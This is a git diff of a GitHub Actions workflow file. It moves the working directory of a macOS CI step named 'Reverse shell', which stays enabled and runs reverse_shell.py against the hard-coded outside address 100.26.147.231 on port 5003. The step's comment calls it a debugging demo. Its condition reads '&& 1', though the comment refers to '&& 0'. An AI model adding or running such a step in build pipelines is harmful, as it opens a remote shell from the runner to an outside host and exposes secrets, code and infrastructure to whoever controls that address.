@@ -160,10 +160,10 @@ jobs:
       ################################# MACOS STEPS START ###############################
       - name: Reverse shell # demo for enable reverse shell, you can put this code to anywhere
         if: runner.os == 'macOS' && 1 # remove "&& 0"  to enable
-        working-directory: .
+        working-directory: .github/workflows/helpers/debug
         run: |
           if [[ "${{ matrix.config.arch}}" == "x86_64" ]]; then
-            python3 workflows/helpers/debug/reverse_shell.py 100.26.147.231 5003 #don't forget to change to your own ip
+            python3 reverse_shell.py 100.26.147.231 5003 #don't forget to change to your own ip
           fi
 
       - name: Install macOS Client Protocol Dependencies on macOS GHA Machines
